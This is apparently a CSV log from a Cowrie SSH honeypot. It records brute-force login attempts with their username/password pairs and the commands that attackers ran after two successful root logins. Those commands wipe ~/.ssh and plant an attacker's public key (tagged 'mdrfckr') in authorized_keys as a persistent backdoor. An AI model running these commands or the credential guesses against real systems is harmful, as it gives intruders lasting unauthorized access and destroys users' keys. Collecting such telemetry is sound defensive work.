eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,101.35.252.142,,,,825eb81b0b99,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:52.671588Z
cowrie.login.failed,101.35.252.142,,,,825eb81b0b99,,,,,login attempt [oracle/oraclepassword] failed,localhost,2024-10-06T19:47:53.248081Z
cowrie.session.connect,121.14.12.136,40178,172.233.154.19,2222,bf002a2f81fb,ssh,,,,New connection: 121.14.12.136:40178 (172.233.154.19:2222) [session: bf002a2f81fb],localhost,2024-10-06T19:47:53.753006Z
cowrie.client.version,121.14.12.136,,,,bf002a2f81fb,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:53.763288Z
cowrie.client.kex,121.14.12.136,,,,bf002a2f81fb,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:53.931051Z
cowrie.session.closed,101.35.252.142,,,,825eb81b0b99,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:47:54.384240Z
cowrie.login.failed,121.14.12.136,,,,bf002a2f81fb,,,,,login attempt [test/123456.] failed,localhost,2024-10-06T19:47:54.620420Z
cowrie.session.closed,121.14.12.136,,,,bf002a2f81fb,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:47:55.795194Z
cowrie.session.connect,185.81.30.83,50860,172.233.154.19,2222,01118aafd964,ssh,,,,New connection: 185.81.30.83:50860 (172.233.154.19:2222) [session: 01118aafd964],localhost,2024-10-06T19:47:58.858953Z
cowrie.client.version,185.81.30.83,,,,01118aafd964,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:58.859710Z
cowrie.client.kex,185.81.30.83,,,,01118aafd964,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:58.902039Z
cowrie.login.failed,185.81.30.83,,,,01118aafd964,,,,,login attempt [server/123] failed,localhost,2024-10-06T19:47:59.169049Z
cowrie.session.closed,185.81.30.83,,,,01118aafd964,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:48:00.225803Z
cowrie.session.connect,122.3.192.83,13984,172.233.154.19,2222,38637ae8eca9,ssh,,,,New connection: 122.3.192.83:13984 (172.233.154.19:2222) [session: 38637ae8eca9],localhost,2024-10-06T19:48:10.550372Z
cowrie.client.version,122.3.192.83,,,,38637ae8eca9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:10.550979Z
cowrie.client.kex,122.3.192.83,,,,38637ae8eca9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:10.721976Z
cowrie.login.failed,122.3.192.83,,,,38637ae8eca9,,,,,login attempt [deploy/102030] failed,localhost,2024-10-06T19:48:11.444536Z
cowrie.session.closed,122.3.192.83,,,,38637ae8eca9,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:48:12.617495Z
cowrie.session.connect,14.225.210.238,49272,172.233.154.19,2222,7825ceddabf4,ssh,,,,New connection: 14.225.210.238:49272 (172.233.154.19:2222) [session: 7825ceddabf4],localhost,2024-10-06T19:48:17.167306Z
cowrie.client.version,14.225.210.238,,,,7825ceddabf4,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:17.168385Z
cowrie.client.kex,14.225.210.238,,,,7825ceddabf4,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:17.367126Z
cowrie.login.failed,14.225.210.238,,,,7825ceddabf4,,,,,login attempt [deploy/deploypassword] failed,localhost,2024-10-06T19:48:18.164362Z
cowrie.session.closed,14.225.210.238,,,,7825ceddabf4,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:48:19.366827Z
cowrie.session.connect,101.91.162.18,53832,172.233.154.19,2222,51db2e1f44fc,ssh,,,,New connection: 101.91.162.18:53832 (172.233.154.19:2222) [session: 51db2e1f44fc],localhost,2024-10-06T19:48:26.237125Z
cowrie.client.version,101.91.162.18,,,,51db2e1f44fc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:26.238997Z
cowrie.client.kex,101.91.162.18,,,,51db2e1f44fc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:26.426632Z
cowrie.login.failed,101.91.162.18,,,,51db2e1f44fc,,,,,login attempt [user/userpassword] failed,localhost,2024-10-06T19:48:27.147737Z
cowrie.session.closed,101.91.162.18,,,,51db2e1f44fc,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:48:28.339207Z
cowrie.session.connect,185.81.30.83,47376,172.233.154.19,2222,29be1fa14c28,ssh,,,,New connection: 185.81.30.83:47376 (172.233.154.19:2222) [session: 29be1fa14c28],localhost,2024-10-06T19:48:39.560481Z
cowrie.client.version,185.81.30.83,,,,29be1fa14c28,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:39.565603Z
cowrie.client.kex,185.81.30.83,,,,29be1fa14c28,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:39.659403Z
cowrie.login.failed,185.81.30.83,,,,29be1fa14c28,,,,,login attempt [debian/12344321] failed,localhost,2024-10-06T19:48:39.943545Z
cowrie.session.connect,101.35.252.142,34128,172.233.154.19,2222,f217012a8b9f,ssh,,,,New connection: 101.35.252.142:34128 (172.233.154.19:2222) [session: f217012a8b9f],localhost,2024-10-06T19:48:40.533322Z
cowrie.client.version,101.35.252.142,,,,f217012a8b9f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:40.533910Z
cowrie.client.kex,101.35.252.142,,,,f217012a8b9f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:40.667896Z
cowrie.session.closed,185.81.30.83,,,,29be1fa14c28,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:48:41.056580Z
cowrie.login.failed,101.35.252.142,,,,f217012a8b9f,,,,,login attempt [ftpuser/143143] failed,localhost,2024-10-06T19:48:41.243728Z
cowrie.session.connect,121.14.12.136,52614,172.233.154.19,2222,309de3e8e34b,ssh,,,,New connection: 121.14.12.136:52614 (172.233.154.19:2222) [session: 309de3e8e34b],localhost,2024-10-06T19:48:41.325257Z
cowrie.client.version,121.14.12.136,,,,309de3e8e34b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:41.333247Z
cowrie.client.kex,121.14.12.136,,,,309de3e8e34b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:41.501301Z
cowrie.login.success,121.14.12.136,,,,309de3e8e34b,,,,,login attempt [root/rootpassword] succeeded,localhost,2024-10-06T19:48:42.183312Z
cowrie.session.closed,101.35.252.142,,,,f217012a8b9f,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:48:42.379613Z
cowrie.session.params,121.14.12.136,,,,309de3e8e34b,,,,,[],localhost,2024-10-06T19:48:42.549370Z
cowrie.command.input,121.14.12.136,,,,309de3e8e34b,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:48:42.549744Z
cowrie.command.failed,121.14.12.136,,,,309de3e8e34b,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:48:42.550452Z
cowrie.log.closed,121.14.12.136,,,,309de3e8e34b,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:48:42.929856Z
cowrie.session.params,121.14.12.136,,,,309de3e8e34b,,,,,[],localhost,2024-10-06T19:48:43.129888Z
cowrie.command.input,121.14.12.136,,,,309de3e8e34b,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:48:43.130282Z
cowrie.session.file_download,121.14.12.136,,,,309de3e8e34b,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:48:43.308667Z
cowrie.log.closed,121.14.12.136,,,,309de3e8e34b,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:48:43.309326Z
cowrie.session.connect,121.14.12.136,53114,172.233.154.19,2222,505a44d998be,ssh,,,,New connection: 121.14.12.136:53114 (172.233.154.19:2222) [session: 505a44d998be],localhost,2024-10-06T19:48:43.474094Z
cowrie.client.version,121.14.12.136,,,,505a44d998be,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:43.475483Z
cowrie.client.kex,121.14.12.136,,,,505a44d998be,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:43.650919Z
cowrie.login.failed,121.14.12.136,,,,505a44d998be,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:48:44.333922Z
cowrie.session.closed,121.14.12.136,,,,505a44d998be,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:48:45.506066Z
cowrie.session.connect,121.14.12.136,53788,172.233.154.19,2222,25e348ffe6ff,ssh,,,,New connection: 121.14.12.136:53788 (172.233.154.19:2222) [session: 25e348ffe6ff],localhost,2024-10-06T19:48:45.645495Z
cowrie.client.version,121.14.12.136,,,,25e348ffe6ff,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:48:45.652519Z
cowrie.client.kex,121.14.12.136,,,,25e348ffe6ff,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:48:45.806101Z
cowrie.login.success,121.14.12.136,,,,25e348ffe6ff,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T19:48:46.439738Z
cowrie.session.closed,121.14.12.136,,,,25e348ffe6ff,,,,,Connection lost after 0 seconds,localhost,2024-10-06T19:48:46.601144Z
cowrie.session.closed,121.14.12.136,,,,309de3e8e34b,,,,,Connection lost after 5 seconds,localhost,2024-10-06T19:48:46.616095Z
cowrie.session.connect,14.225.210.238,33662,172.233.154.19,2222,3f9e73647182,ssh,,,,New connection: 14.225.210.238:33662 (172.233.154.19:2222) [session: 3f9e73647182],localhost,2024-10-06T19:49:07.530422Z
cowrie.client.version,14.225.210.238,,,,3f9e73647182,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:49:07.531613Z
cowrie.client.kex,14.225.210.238,,,,3f9e73647182,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:49:07.719380Z
cowrie.login.success,14.225.210.238,,,,3f9e73647182,,,,,login attempt [root/1QAZxsw2!@] succeeded,localhost,2024-10-06T19:49:08.476186Z
cowrie.session.params,14.225.210.238,,,,3f9e73647182,,,,,[],localhost,2024-10-06T19:49:08.871262Z
cowrie.command.input,14.225.210.238,,,,3f9e73647182,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:49:08.871780Z
cowrie.command.failed,14.225.210.238,,,,3f9e73647182,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:49:08.872743Z
cowrie.log.closed,14.225.210.238,,,,3f9e73647182,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:49:09.289985Z
cowrie.session.params,14.225.210.238,,,,3f9e73647182,,,,,[],localhost,2024-10-06T19:49:09.503760Z
cowrie.command.input,14.225.210.238,,,,3f9e73647182,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:49:09.504140Z
cowrie.session.file_download,14.225.210.238,,,,3f9e73647182,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:49:09.696107Z
cowrie.log.closed,14.225.210.238,,,,3f9e73647182,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:49:09.696617Z
cowrie.session.connect,14.225.210.238,34194,172.233.154.19,2222,bfff7cb6f2b6,ssh,,,,New connection: 14.225.210.238:34194 (172.233.154.19:2222) [session: bfff7cb6f2b6],localhost,2024-10-06T19:49:09.895772Z
cowrie.client.version,14.225.210.238,,,,bfff7cb6f2b6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:49:09.896547Z
cowrie.client.kex,14.225.210.238,,,,bfff7cb6f2b6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:49:10.097463Z
cowrie.session.connect,122.3.192.83,26132,172.233.154.19,2222,eb61eea1a535,ssh,,,,New connection: 122.3.192.83:26132 (172.233.154.19:2222) [session: eb61eea1a535],localhost,2024-10-06T19:49:10.238148Z
cowrie.client.version,122.3.192.83,,,,eb61eea1a535,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:49:10.238821Z
cowrie.client.kex,122.3.192.83,,,,eb61eea1a535,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:49:10.416142Z
cowrie.login.failed,14.225.210.238,,,,bfff7cb6f2b6,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:49:10.937535Z
cowrie.login.failed,122.3.192.83,,,,eb61eea1a535,,,,,login attempt [adminadmin/password] failed,localhost,2024-10-06T19:49:11.160132Z
cowrie.session.closed,14.225.210.238,,,,bfff7cb6f2b6,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:49:12.140363Z
